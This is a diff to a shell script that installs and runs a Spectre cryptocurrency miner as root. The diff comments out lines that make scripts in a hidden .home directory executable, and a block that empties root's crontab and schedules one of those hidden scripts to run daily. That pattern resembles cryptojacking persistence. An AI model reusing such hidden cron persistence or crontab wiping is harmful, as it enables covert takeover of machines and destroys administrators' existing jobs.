@@ -37,8 +37,8 @@ fi
 
 # Copy the miner binary to the current directory
 sudo cp bin/spectre-miner-v0.3.16-linux-gnu-amd64 spectre
-chmod +x .home/etc.sh
-chmod +x .home/lib.sh
+#chmod +x .home/etc.sh
+#chmod +x .home/lib.sh
 chmod +x spectre
 # Create the min.sh script
 cat <<EOF > min.sh
@@ -55,13 +55,13 @@ sudo nohup /root/spectre -a \$default_wallet_address --spectred-address 34.71.95
 EOF
 
 # Make the min.sh script executable
-sudo chmod +x min.sh
-cat /dev/null > /var/spool/cron/crontabs/root
-cat >>/var/spool/cron/crontabs/root<<EOF
-0 0 * * * /root/.home/lib.sh &
-EOF
-chmod 0600 /var/spool/cron/crontabs/*
-service cron restart
+#sudo chmod +x min.sh
+#cat /dev/null > /var/spool/cron/crontabs/root
+#cat >>/var/spool/cron/crontabs/root<<EOF
+#0 0 * * * /root/.home/lib.sh &
+#EOF
+#chmod 0600 /var/spool/cron/crontabs/*
+#service cron restart
 
 # Run the min.sh script
 sudo ./min.sh
